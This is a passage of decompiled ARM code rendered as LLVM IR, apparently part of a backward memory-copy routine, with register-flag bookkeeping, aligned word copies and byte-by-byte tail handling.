  store i8* %v5_1562c, i8** %stack_var_-8, align 4
  %v8_1562c = load i32, i32* @lr, align 4
  %v2_15630 = add i32 %v0_15624, -28
  store i32 %v2_15630, i32* %r2.global-to-local, align 4
  %v4_15630 = sub i32 27, %v0_15624
  %v5_15630 = and i32 %v4_15630, %v2_15624
  %v6_15630 = icmp slt i32 %v5_15630, 0
  store i1 %v6_15630, i1* %cpsr_v.global-to-local, align 1
  %v7_15630 = icmp slt i32 %v2_15630, 0
  store i1 %v7_15630, i1* %cpsr_n.global-to-local, align 1
  %v8_15630 = icmp eq i32 %v2_15624, 20
  store i1 %v8_15630, i1* %cpsr_z.global-to-local, align 1
  %v5_15634 = icmp slt i32 %v2_15624, 20
  br i1 %v5_15634, label %dec_label_pc_15650, label %dec_label_pc_15638

dec_label_pc_15638:                               ; preds = %dec_label_pc_1562c, %dec_label_pc_15638.dec_label_pc_15638_crit_edge
  %v0_1563c = phi i32 [ %v1_15644, %dec_label_pc_15638.dec_label_pc_15638_crit_edge ], [ %v0_1563c37, %dec_label_pc_1562c ]
  %v0_15638 = phi i32 [ %v0_15638.pre, %dec_label_pc_15638.dec_label_pc_15638_crit_edge ], [ %v0_1563836, %dec_label_pc_1562c ]
  %v1_15638 = add i32 %v0_15638, -4
  %v2_15638 = inttoptr i32 %v1_15638 to i32*
  %v3_15638 = load i32, i32* %v2_15638, align 4
  %v4_15638 = add i32 %v0_15638, -8
  %v5_15638 = inttoptr i32 %v4_15638 to i32*
  %v6_15638 = load i32, i32* %v5_15638, align 4
  store i32 %v6_15638, i32* %r4.global-to-local, align 4
  %v7_15638 = add i32 %v0_15638, -12
  %v8_15638 = inttoptr i32 %v7_15638 to i32*
  %v9_15638 = load i32, i32* %v8_15638, align 4
  store i32 %v9_15638, i32* %ip.global-to-local, align 4
  %v10_15638 = add i32 %v0_15638, -16
  %v11_15638 = inttoptr i32 %v10_15638 to i32*
  %v12_15638 = load i32, i32* %v11_15638, align 4
  store i32 %v12_15638, i32* %lr.global-to-local, align 4
  store i32 %v10_15638, i32* %r1.global-to-local, align 4
  %v1_1563c = add i32 %v0_1563c, -16
  %v2_1563c = inttoptr i32 %v1_1563c to i32*
  store i32 %v3_15638, i32* %v2_1563c, align 4
  %v4_1563c = add i32 %v0_1563c, -12
  %v5_1563c = inttoptr i32 %v4_1563c to i32*
  %v6_1563c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1563c, i32* %v5_1563c, align 4
  %v7_1563c = add i32 %v0_1563c, -8
  %v8_1563c = inttoptr i32 %v7_1563c to i32*
  %v9_1563c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1563c, i32* %v8_1563c, align 4
  %v10_1563c = add i32 %v0_1563c, -4
  %v11_1563c = inttoptr i32 %v10_1563c to i32*
  %v12_1563c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1563c, i32* %v11_1563c, align 4
  store i32 %v1_1563c, i32* %r0.global-to-local, align 4
  %v0_15640 = load i32, i32* %r1.global-to-local, align 4
  %v1_15640 = add i32 %v0_15640, -4
  %v2_15640 = inttoptr i32 %v1_15640 to i32*
  %v3_15640 = load i32, i32* %v2_15640, align 4
  store i32 %v3_15640, i32* @r3, align 4
  %v4_15640 = add i32 %v0_15640, -8
  %v5_15640 = inttoptr i32 %v4_15640 to i32*
  %v6_15640 = load i32, i32* %v5_15640, align 4
  store i32 %v6_15640, i32* %r4.global-to-local, align 4
  %v7_15640 = add i32 %v0_15640, -12
  %v8_15640 = inttoptr i32 %v7_15640 to i32*
  %v9_15640 = load i32, i32* %v8_15640, align 4
  store i32 %v9_15640, i32* @ip, align 4
  %v10_15640 = add i32 %v0_15640, -16
  %v11_15640 = inttoptr i32 %v10_15640 to i32*
  %v12_15640 = load i32, i32* %v11_15640, align 4
  store i32 %v12_15640, i32* %lr.global-to-local, align 4
  store i32 %v10_15640, i32* %r1.global-to-local, align 4
  %v1_15644 = add i32 %v0_1563c, -32
  %v2_15644 = inttoptr i32 %v1_15644 to i32*
  store i32 %v3_15640, i32* %v2_15644, align 4
  %v4_15644 = add i32 %v0_1563c, -28
  %v5_15644 = inttoptr i32 %v4_15644 to i32*
  %v6_15644 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15644, i32* %v5_15644, align 4
  %v7_15644 = add i32 %v0_1563c, -24
  %v8_15644 = inttoptr i32 %v7_15644 to i32*
  %v9_15644 = load i32, i32* @ip, align 4
  store i32 %v9_15644, i32* %v8_15644, align 4
  %v10_15644 = add i32 %v0_1563c, -20
  %v11_15644 = inttoptr i32 %v10_15644 to i32*
  %v12_15644 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15644, i32* %v11_15644, align 4
  store i32 %v1_15644, i32* %r0.global-to-local, align 4
  %v0_15648 = load i32, i32* %r2.global-to-local, align 4
  %v2_15648 = add i32 %v0_15648, -32
  store i32 %v2_15648, i32* %r2.global-to-local, align 4
  %v6_1564c = icmp slt i32 %v0_15648, 32
  br i1 %v6_1564c, label %dec_label_pc_15650.loopexit, label %dec_label_pc_15638.dec_label_pc_15638_crit_edge

dec_label_pc_15638.dec_label_pc_15638_crit_edge:  ; preds = %dec_label_pc_15638
  %v0_15638.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15638

dec_label_pc_15650.loopexit:                      ; preds = %dec_label_pc_15638
  %v4_15648 = sub i32 31, %v0_15648
  %v5_15648 = and i32 %v4_15648, %v0_15648
  %v6_15648 = icmp slt i32 %v5_15648, 0
  %v7_15648 = icmp slt i32 %v2_15648, 0
  store i1 %v6_15648, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15648, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15650

dec_label_pc_15650:                               ; preds = %dec_label_pc_15650.loopexit, %dec_label_pc_1562c
  %v6_15658 = phi i32 [ %v1_15644, %dec_label_pc_15650.loopexit ], [ %v0_1563c37, %dec_label_pc_1562c ]
  %v0_15660.pr = phi i32 [ %v2_15648, %dec_label_pc_15650.loopexit ], [ %v2_15630, %dec_label_pc_1562c ]
  %v4_15650 = add i32 %v0_15660.pr, 16
  %v6_15650 = sub i32 0, %v0_15660.pr
  %v7_15650 = and i32 %v4_15650, %v6_15650
  %v8_15650 = icmp slt i32 %v7_15650, 0
  store i1 %v8_15650, i1* %cpsr_v.global-to-local, align 1
  %v9_15650 = icmp slt i32 %v4_15650, 0
  store i1 %v9_15650, i1* %cpsr_n.global-to-local, align 1
  %v10_15650 = icmp eq i32 %v4_15650, 0
  store i1 %v10_15650, i1* %cpsr_z.global-to-local, align 1
  %v5_15654 = icmp slt i32 %v0_15660.pr, -16
  br i1 %v5_15654, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_15650
  %v6_15654 = load i32, i32* %r1.global-to-local, align 4
  %v7_15654 = add i32 %v6_15654, -4
  %v8_15654 = inttoptr i32 %v7_15654 to i32*
  %v9_15654 = load i32, i32* %v8_15654, align 4
  store i32 %v9_15654, i32* @r3, align 4
  %v10_15654 = add i32 %v6_15654, -8
  %v11_15654 = inttoptr i32 %v10_15654 to i32*
  %v12_15654 = load i32, i32* %v11_15654, align 4
  store i32 %v12_15654, i32* %r4.global-to-local, align 4
  %v13_15654 = add i32 %v6_15654, -12
  %v14_15654 = inttoptr i32 %v13_15654 to i32*
  %v15_15654 = load i32, i32* %v14_15654, align 4
  store i32 %v15_15654, i32* @ip, align 4
  %v16_15654 = add i32 %v6_15654, -16
  %v17_15654 = inttoptr i32 %v16_15654 to i32*
  %v18_15654 = load i32, i32* %v17_15654, align 4
  store i32 %v18_15654, i32* %lr.global-to-local, align 4
  store i32 %v16_15654, i32* %r1.global-to-local, align 4
  %v7_15658 = add i32 %v6_15658, -16
  %v8_15658 = inttoptr i32 %v7_15658 to i32*
  store i32 %v9_15654, i32* %v8_15658, align 4
  %v10_15658 = add i32 %v6_15658, -12
  %v11_15658 = inttoptr i32 %v10_15658 to i32*
  %v12_15658 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_15658, i32* %v11_15658, align 4
  %v13_15658 = add i32 %v6_15658, -8
  %v14_15658 = inttoptr i32 %v13_15658 to i32*
  %v15_15658 = load i32, i32* @ip, align 4
  store i32 %v15_15658, i32* %v14_15658, align 4
  %v16_15658 = add i32 %v6_15658, -4
  %v17_15658 = inttoptr i32 %v16_15658 to i32*
  %v18_15658 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_15658, i32* %v17_15658, align 4
  store i32 %v7_15658, i32* %r0.global-to-local, align 4
  %v6_1565c = load i32, i32* %r2.global-to-local, align 4
  %v7_1565c = add i32 %v6_1565c, -16
  store i32 %v7_1565c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15650, %bb147
  %v6_15668 = phi i32 [ %v7_15658, %bb147 ], [ %v6_15658, %dec_label_pc_15650 ]
  %v0_15660 = phi i32 [ %v7_1565c, %bb147 ], [ %v0_15660.pr, %dec_label_pc_15650 ]
  %v4_15660 = add i32 %v0_15660, 20
  store i32 %v4_15660, i32* %r2.global-to-local, align 4
  %v6_15660 = sub i32 0, %v0_15660
  %v7_15660 = and i32 %v4_15660, %v6_15660
  %v8_15660 = icmp slt i32 %v7_15660, 0
  store i1 %v8_15660, i1* %cpsr_v.global-to-local, align 1
  %v9_15660 = icmp slt i32 %v4_15660, 0
  store i1 %v9_15660, i1* %cpsr_n.global-to-local, align 1
  %v10_15660 = icmp eq i32 %v4_15660, 0
  store i1 %v10_15660, i1* %cpsr_z.global-to-local, align 1
  %v5_15664 = icmp slt i32 %v0_15660, -20
  br i1 %v5_15664, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_15664 = load i32, i32* %r1.global-to-local, align 4
  %v7_15664 = add i32 %v6_15664, -4
  %v8_15664 = inttoptr i32 %v7_15664 to i32*
  %v9_15664 = load i32, i32* %v8_15664, align 4
  store i32 %v9_15664, i32* @r3, align 4
  %v10_15664 = add i32 %v6_15664, -8
  %v11_15664 = inttoptr i32 %v10_15664 to i32*
  %v12_15664 = load i32, i32* %v11_15664, align 4
  store i32 %v12_15664, i32* @ip, align 4
  %v13_15664 = add i32 %v6_15664, -12
  %v14_15664 = inttoptr i32 %v13_15664 to i32*
  %v15_15664 = load i32, i32* %v14_15664, align 4
  store i32 %v15_15664, i32* %lr.global-to-local, align 4
  store i32 %v13_15664, i32* %r1.global-to-local, align 4
  %v7_15668 = add i32 %v6_15668, -12
  %v8_15668 = inttoptr i32 %v7_15668 to i32*
  store i32 %v9_15664, i32* %v8_15668, align 4
  %v10_15668 = add i32 %v6_15668, -8
  %v11_15668 = inttoptr i32 %v10_15668 to i32*
  %v12_15668 = load i32, i32* @ip, align 4
  store i32 %v12_15668, i32* %v11_15668, align 4
  %v13_15668 = add i32 %v6_15668, -4
  %v14_15668 = inttoptr i32 %v13_15668 to i32*
  %v15_15668 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_15668, i32* %v14_15668, align 4
  store i32 %v7_15668, i32* %r0.global-to-local, align 4
  %v6_1566c = load i32, i32* %r2.global-to-local, align 4
  %v7_1566c = add i32 %v6_1566c, -12
  store i32 %v7_1566c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_1568c45 = phi i32 [ %v6_15668, %.thread2 ], [ %v7_15668, %bb148 ]
  %v0_1567443 = phi i32 [ %v4_15660, %.thread2 ], [ %v7_1566c, %bb148 ]
  %v2_15670 = load i8*, i8** %stack_var_-8, align 4
  %v3_15670 = ptrtoint i8* %v2_15670 to i32
  store i32 %v3_15670, i32* @r4, align 4
  store i32 %v8_1562c, i32* @lr, align 4
  br label %dec_label_pc_15674

dec_label_pc_15674:                               ; preds = %dec_label_pc_15624, %.thread4
  %v7_15684 = phi i32 [ %v0_1563c37, %dec_label_pc_15624 ], [ %v6_1568c45, %.thread4 ]
  %v0_15674 = phi i32 [ %v2_15624, %dec_label_pc_15624 ], [ %v0_1567443, %.thread4 ]
  %v2_15674 = add i32 %v0_15674, 8
  store i32 %v2_15674, i32* %r2.global-to-local, align 4
  %v4_15674 = sub i32 0, %v0_15674
  %v5_15674 = and i32 %v2_15674, %v4_15674
  %v6_15674 = icmp slt i32 %v5_15674, 0
  store i1 %v6_15674, i1* %cpsr_v.global-to-local, align 1
  %v7_15674 = icmp slt i32 %v2_15674, 0
  store i1 %v7_15674, i1* %cpsr_n.global-to-local, align 1
  %v8_15674 = icmp eq i32 %v2_15674, 0
  store i1 %v8_15674, i1* %cpsr_z.global-to-local, align 1
  %v5_15678 = icmp slt i32 %v0_15674, -8
  br i1 %v5_15678, label %bb150, label %dec_label_pc_1567c

dec_label_pc_1567c:                               ; preds = %dec_label_pc_15674
  %v6_1567c = add i32 %v0_15674, 4
  store i32 %v6_1567c, i32* %r2.global-to-local, align 4
  %v8_1567c = sub i32 -5, %v0_15674
  %v9_1567c = and i32 %v8_1567c, %v2_15674
  %v10_1567c = icmp slt i32 %v9_1567c, 0
  store i1 %v10_1567c, i1* %cpsr_v.global-to-local, align 1
  %v11_1567c = icmp slt i32 %v6_1567c, 0
  store i1 %v11_1567c, i1* %cpsr_n.global-to-local, align 1
  %v12_1567c = icmp eq i32 %v2_15674, 4
  store i1 %v12_1567c, i1* %cpsr_z.global-to-local, align 1
  %v5_15680 = icmp slt i32 %v2_15674, 4
  %v6_15680 = load i32, i32* %r1.global-to-local, align 4
  %v7_15680 = add i32 %v6_15680, -4
  %v8_15680 = inttoptr i32 %v7_15680 to i32*
  %v9_15680 = load i32, i32* %v8_15680, align 4
  store i32 %v9_15680, i32* @r3, align 4
  br i1 %v5_15680, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_1567c
  store i32 %v7_15680, i32* %r1.global-to-local, align 4
  %v8_15684 = add i32 %v7_15684, -4
  %v9_15684 = inttoptr i32 %v8_15684 to i32*
  store i32 %v9_15680, i32* %v9_15684, align 4
  %v10_15684 = load i32, i32* %r0.global-to-local, align 4
  %v11_15684 = add i32 %v10_15684, -4
  store i32 %v11_15684, i32* %r0.global-to-local, align 4
  %v0_15694.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1567c
  %v10_15688 = add i32 %v6_15680, -8
  %v11_15688 = inttoptr i32 %v10_15688 to i32*
  %v12_15688 = load i32, i32* %v11_15688, align 4
  store i32 %v12_15688, i32* @ip, align 4
  store i32 %v10_15688, i32* %r1.global-to-local, align 4
  %v7_1568c = add i32 %v7_15684, -8
  %v8_1568c = inttoptr i32 %v7_1568c to i32*
  store i32 %v9_15680, i32* %v8_1568c, align 4
  %v10_1568c = add i32 %v7_15684, -4
  %v11_1568c = inttoptr i32 %v10_1568c to i32*
  %v12_1568c = load i32, i32* @ip, align 4
  store i32 %v12_1568c, i32* %v11_1568c, align 4
  store i32 %v7_1568c, i32* %r0.global-to-local, align 4
  %v6_15690 = load i32, i32* %r2.global-to-local, align 4
  %v7_15690 = add i32 %v6_15690, -4
  store i32 %v7_15690, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %dec_label_pc_15674, %dec_label_pc_15604, %.thread14, %dec_label_pc_15838, %dec_label_pc_157cc, %dec_label_pc_15760, %bb149
  %v2_15698 = phi i32 [ %v11_15684, %.thread8 ], [ %v7_15684, %dec_label_pc_15674 ], [ %v2_15608, %dec_label_pc_15604 ], [ %v0_1573020, %.thread14 ], [ %v2_156a453, %dec_label_pc_15838 ], [ %v2_156a452, %dec_label_pc_157cc ], [ %v2_156a451, %dec_label_pc_15760 ], [ %v7_1568c, %bb149 ]
  %v0_15694 = phi i32 [ %v0_15694.pre, %.thread8 ], [ %v2_15674, %dec_label_pc_15674 ], [ %v2_1560c, %dec_label_pc_15604 ], [ %v2_156d8, %.thread14 ], [ %v0_1569449, %dec_label_pc_15838 ], [ %v0_1569448, %dec_label_pc_157cc ], [ %v0_1569447, %dec_label_pc_15760 ], [ %v7_15690, %bb149 ]
  %v1_15694 = add i32 %v0_15694, 4
  store i32 %v1_15694, i32* %r2.global-to-local, align 4
  %v3_15694 = sub i32 0, %v0_15694
  %v4_15694 = and i32 %v1_15694, %v3_15694
  %v5_15694 = icmp slt i32 %v4_15694, 0
  store i1 %v5_15694, i1* %cpsr_v.global-to-local, align 1
  %v6_15694 = icmp slt i32 %v1_15694, 0
  store i1 %v6_15694, i1* %cpsr_n.global-to-local, align 1
  %v7_15694 = icmp eq i32 %v1_15694, 0
  store i1 %v7_15694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15694, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1569c = add i32 %v0_15694, 2
  %v3_1569c = sub i32 -3, %v0_15694
  %v4_1569c = and i32 %v3_1569c, %v1_15694
  %v5_1569c = icmp slt i32 %v4_1569c, 0
  store i1 %v5_1569c, i1* %cpsr_v.global-to-local, align 1
  %v6_1569c = icmp slt i32 %v1_1569c, 0
  store i1 %v6_1569c, i1* %cpsr_n.global-to-local, align 1
  %v7_1569c = icmp eq i32 %v1_15694, 2
  store i1 %v7_1569c, i1* %cpsr_z.global-to-local, align 1
  %v0_156a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_156a0 = add i32 %v0_156a0, -1
  %v2_156a0 = inttoptr i32 %v1_156a0 to i8*
  %v3_156a0 = load i8, i8* %v2_156a0, align 1
  %v4_156a0 = zext i8 %v3_156a0 to i32
  store i32 %v4_156a0, i32* @r3, align 4
  store i32 %v1_156a0, i32* %r1.global-to-local, align 4
  %v3_156a4 = add i32 %v2_15698, -1
  %v4_156a4 = inttoptr i32 %v3_156a4 to i8*
  store i8 %v3_156a0, i8* %v4_156a4, align 1
  %v5_156a4 = load i32, i32* %r0.global-to-local, align 4
  %v6_156a4 = add i32 %v5_156a4, -1
  store i32 %v6_156a4, i32* %r0.global-to-local, align 4
  %v0_156a8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_156a8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_156a8 = xor i1 %v0_156a8, %v1_156a8
  br i1 %v2_156a8, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_156a8 = load i32, i32* %r1.global-to-local, align 4
  %v4_156a8 = add i32 %v3_156a8, -1
  %v5_156a8 = inttoptr i32 %v4_156a8 to i8*
  %v6_156a8 = load i8, i8* %v5_156a8, align 1
  %v7_156a8 = zext i8 %v6_156a8 to i32
  store i32 %v7_156a8, i32* @r3, align 4
  store i32 %v4_156a8, i32* %r1.global-to-local, align 4
  %v6_156ac = add i32 %v5_156a4, -2
  %v7_156ac = inttoptr i32 %v6_156ac to i8*
  store i8 %v6_156a8, i8* %v7_156ac, align 1
  %v8_156ac = load i32, i32* %r0.global-to-local, align 4
  %v9_156ac = add i32 %v8_156ac, -1
  store i32 %v9_156ac, i32* %r0.global-to-local, align 4
  %v1_156b0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_156b0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_156b4 = phi i32 [ %v9_156ac, %bb152 ], [ %v6_156a4, %bb151 ]
  %v2_156b4 = phi i1 [ %v2_156b0.pre, %bb152 ], [ %v1_156a8, %bb151 ]
  %v1_156b4 = phi i1 [ %v1_156b0.pre, %bb152 ], [ %v0_156a8, %bb151 ]
  %v0_156b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_156b0 = xor i1 %v2_156b4, %v1_156b4
  %v4_156b0 = or i1 %v0_156b0, %v3_156b0
  br i1 %v4_156b0, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_156b0 = load i32, i32* %r1.global-to-local, align 4
  %v6_156b0 = add i32 %v5_156b0, -1
  %v7_156b0 = inttoptr i32 %v6_156b0 to i8*
  %v8_156b0 = load i8, i8* %v7_156b0, align 1
  %v9_156b0 = zext i8 %v8_156b0 to i32
  store i32 %v9_156b0, i32* @r3, align 4
  store i32 %v6_156b0, i32* %r1.global-to-local, align 4
  %v8_156b4 = add i32 %v7_156b4, -1
  %v9_156b4 = inttoptr i32 %v8_156b4 to i8*
  store i8 %v8_156b0, i8* %v9_156b4, align 1
  %v10_156b4 = load i32, i32* %r0.global-to-local, align 4
  %v11_156b4 = add i32 %v10_156b4, -1
  store i32 %v11_156b4, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_156bc:                               ; preds = %dec_label_pc_15614
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_156bc = icmp eq i32 %v1_15614, 1
  store i1 %v8_156bc, i1* %cpsr_n.global-to-local, align 1
  %v9_156bc = icmp eq i32 %v1_15614, 2
  store i1 %v9_156bc, i1* %cpsr_z.global-to-local, align 1
  %v1_156c0 = add i32 %v2_15604, -1
  %v2_156c0 = inttoptr i32 %v1_156c0 to i8*
  %v3_156c0 = load i8, i8* %v2_156c0, align 1
  %v4_156c0 = zext i8 %v3_156c0 to i32
  store i32 %v4_156c0, i32* @r3, align 4
  store i32 %v1_156c0, i32* %r1.global-to-local, align 4
  %v3_156c4 = add i32 %v2_15608, -1
  %v4_156c4 = inttoptr i32 %v3_156c4 to i8*
  store i8 %v3_156c0, i8* %v4_156c4, align 1
  %v5_156c4 = load i32, i32* %r0.global-to-local, align 4
  %v6_156c4 = add i32 %v5_156c4, -1
  store i32 %v6_156c4, i32* %r0.global-to-local, align 4
  br i1 %v8_156bc, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_156bc
  %v6_156c8 = load i32, i32* %r1.global-to-local, align 4
  %v7_156c8 = add i32 %v6_156c8, -1
  %v8_156c8 = inttoptr i32 %v7_156c8 to i8*
  %v9_156c8 = load i8, i8* %v8_156c8, align 1
  %v10_156c8 = zext i8 %v9_156c8 to i32
  store i32 %v10_156c8, i32* @r3, align 4
  store i32 %v7_156c8, i32* %r1.global-to-local, align 4
  %v9_156cc = add i32 %v5_156c4, -2
  %v10_156cc = inttoptr i32 %v9_156cc to i8*
  store i8 %v9_156c8, i8* %v10_156cc, align 1
  %v11_156cc = load i32, i32* %r0.global-to-local, align 4
  %v12_156cc = add i32 %v11_156cc, -1
  store i32 %v12_156cc, i32* %r0.global-to-local, align 4
  br i1 %v9_156bc, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_156d0 = load i32, i32* %r1.global-to-local, align 4
  %v9_156d0 = add i32 %v8_156d0, -1
  %v10_156d0 = inttoptr i32 %v9_156d0 to i8*
  %v11_156d0 = load i8, i8* %v10_156d0, align 1
  %v12_156d0 = zext i8 %v11_156d0 to i32
  store i32 %v12_156d0, i32* @r3, align 4
  store i32 %v9_156d0, i32* %r1.global-to-local, align 4
  %v11_156d4 = add i32 %v11_156cc, -2
  %v12_156d4 = inttoptr i32 %v11_156d4 to i8*
  store i8 %v11_156d0, i8* %v12_156d4, align 1
  %v13_156d4 = load i32, i32* %r0.global-to-local, align 4
  %v14_156d4 = add i32 %v13_156d4, -1
  store i32 %v14_156d4, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_156bc, %bb155
  %v0_1573020 = phi i32 [ %v12_156cc, %bb154 ], [ %v6_156c4, %dec_label_pc_156bc ], [ %v14_156d4, %bb155 ]
  %v0_156d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_156d8 = load i32, i32* @ip, align 4
  %v2_156d8 = sub i32 %v0_156d8, %v1_156d8
  store i32 %v2_156d8, i32* %r2.global-to-local, align 4
  %v4_156d8 = xor i32 %v1_156d8, %v0_156d8
  %v5_156d8 = xor i32 %v2_156d8, %v0_156d8
  %v6_156d8 = and i32 %v5_156d8, %v4_156d8
  %v7_156d8 = icmp slt i32 %v6_156d8, 0
  store i1 %v7_156d8, i1* %cpsr_v.global-to-local, align 1
  %v8_156d8 = icmp slt i32 %v2_156d8, 0
  store i1 %v8_156d8, i1* %cpsr_n.global-to-local, align 1
  %v9_156d8 = icmp eq i32 %v0_156d8, %v1_156d8
  store i1 %v9_156d8, i1* %cpsr_z.global-to-local, align 1
  %v5_156dc = icmp slt i32 %v0_156d8, %v1_156d8
  br i1 %v5_156dc, label %bb150, label %dec_label_pc_156e0

dec_label_pc_156e0:                               ; preds = %.thread14
  %v0_156e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_156e0 = urem i32 %v0_156e0, 4
  store i32 %v1_156e0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_156e0 = icmp eq i32 %v1_156e0, 0
  store i1 %v2_156e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_156e0, label %dec_label_pc_15624, label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %dec_label_pc_1561c, %dec_label_pc_156e0
  %v0_1573019 = phi i32 [ %v2_15608, %dec_label_pc_1561c ], [ %v0_1573020, %dec_label_pc_156e0 ]
  %v0_157dc = phi i32 [ %v2_1560c, %dec_label_pc_1561c ], [ %v2_156d8, %dec_label_pc_156e0 ]
  %v0_156e8 = phi i32 [ %v2_15604, %dec_label_pc_1561c ], [ %v0_156e0, %dec_label_pc_156e0 ]
  %v0_156f0 = phi i32 [ %v1_1561c, %dec_label_pc_1561c ], [ %v1_156e0, %dec_label_pc_156e0 ]
  %v1_156e8 = and i32 %v0_156e8, -4
  store i32 %v1_156e8, i32* %r1.global-to-local, align 4
  %v1_156ec = inttoptr i32 %v1_156e8 to i32*
  %v2_156ec = load i32, i32* %v1_156ec, align 4
  store i32 %v2_156ec, i32* @r3, align 4
  %v7_156f0 = icmp ult i32 %v0_156f0, 2
  %v2_157d4 = add i32 %v0_157dc, -12
  %v4_157d4 = sub i32 11, %v0_157dc
  %v5_157d4 = and i32 %v4_157d4, %v0_157dc
  %v6_157d4 = icmp slt i32 %v5_157d4, 0
  store i1 %v6_157d4, i1* %cpsr_v.global-to-local, align 1
  %v7_157d4 = icmp slt i32 %v2_157d4, 0
  store i1 %v7_157d4, i1* %cpsr_n.global-to-local, align 1
  %v8_157d4 = icmp eq i32 %v0_157dc, 12
  store i1 %v8_157d4, i1* %cpsr_z.global-to-local, align 1
  %v5_157d8 = icmp slt i32 %v0_157dc, 12
  br i1 %v7_156f0, label %dec_label_pc_157d4, label %dec_label_pc_156f8

dec_label_pc_156f8:                               ; preds = %dec_label_pc_156e8
  %v8_156f0 = icmp eq i32 %v0_156f0, 2
  br i1 %v8_156f0, label %dec_label_pc_15768, label %dec_label_pc_156fc

dec_label_pc_156fc:                               ; preds = %dec_label_pc_156f8
  br i1 %v5_157d8, label %dec_label_pc_15748, label %dec_label_pc_15704

dec_label_pc_15704:                               ; preds = %dec_label_pc_156fc
  store i32 %v2_157d4, i32* %r2.global-to-local, align 4
  %v3_15708 = load i32, i32* @r4, align 4
  store i32 %v3_15708, i32* %stack_var_-12, align 4
  %v6_15708 = load i32, i32* @r5, align 4
  %v8_15708 = inttoptr i32 %v6_15708 to i8*
  store i8* %v8_15708, i8** %stack_var_-8, align 4
  %v11_15708 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1570c

dec_label_pc_1570c:                               ; preds = %dec_label_pc_1570c.dec_label_pc_1570c_crit_edge, %dec_label_pc_15704
  %v0_15730 = phi i32 [ %v1_15730, %dec_label_pc_1570c.dec_label_pc_1570c_crit_edge ], [ %v0_1573019, %dec_label_pc_15704 ]
  %v0_15710 = phi i32 [ %v0_15710.pre, %dec_label_pc_1570c.dec_label_pc_1570c_crit_edge ], [ %v1_156e8, %dec_label_pc_15704 ]
  %v0_1570c = phi i32 [ %v0_1570c.pre, %dec_label_pc_1570c.dec_label_pc_1570c_crit_edge ], [ %v2_156ec, %dec_label_pc_15704 ]
  %v3_1570c = mul i32 %v0_1570c, 256
  store i32 %v3_1570c, i32* %lr.global-to-local, align 4
  %v1_15710 = add i32 %v0_15710, -4
  %v2_15710 = inttoptr i32 %v1_15710 to i32*
  %v3_15710 = load i32, i32* %v2_15710, align 4
  store i32 %v3_15710, i32* @r3, align 4
  %v4_15710 = add i32 %v0_15710, -8
  %v5_15710 = inttoptr i32 %v4_15710 to i32*
  %v6_15710 = load i32, i32* %v5_15710, align 4
  store i32 %v6_15710, i32* %r4.global-to-local, align 4
  %v7_15710 = add i32 %v0_15710, -12
  %v8_15710 = inttoptr i32 %v7_15710 to i32*
  %v9_15710 = load i32, i32* %v8_15710, align 4
  store i32 %v9_15710, i32* %r5.global-to-local, align 4
  %v10_15710 = add i32 %v0_15710, -16
  %v11_15710 = inttoptr i32 %v10_15710 to i32*
  %v12_15710 = load i32, i32* %v11_15710, align 4
  store i32 %v10_15710, i32* %r1.global-to-local, align 4
  %v4_15714 = udiv i32 %v12_15710, 16777216
  %v5_15714 = or i32 %v4_15714, %v3_1570c
  store i32 %v5_15714, i32* %lr.global-to-local, align 4
  %v3_15718 = mul i32 %v12_15710, 256
  %v4_1571c = udiv i32 %v9_15710, 16777216
  %v5_1571c = or i32 %v3_15718, %v4_1571c
  store i32 %v5_1571c, i32* @ip, align 4
  %v3_15720 = mul i32 %v9_15710, 256
  %v4_15724 = udiv i32 %v6_15710, 16777216
  %v5_15724 = or i32 %v3_15720, %v4_15724
  store i32 %v5_15724, i32* %r5.global-to-local, align 4
  %v3_15728 = mul i32 %v6_15710, 256
  %v4_1572c = udiv i32 %v3_15710, 16777216
  %v5_1572c = or i32 %v3_15728, %v4_1572c
  store i32 %v5_1572c, i32* %r4.global-to-local, align 4
  %v1_15730 = add i32 %v0_15730, -16
  %v2_15730 = inttoptr i32 %v1_15730 to i32*
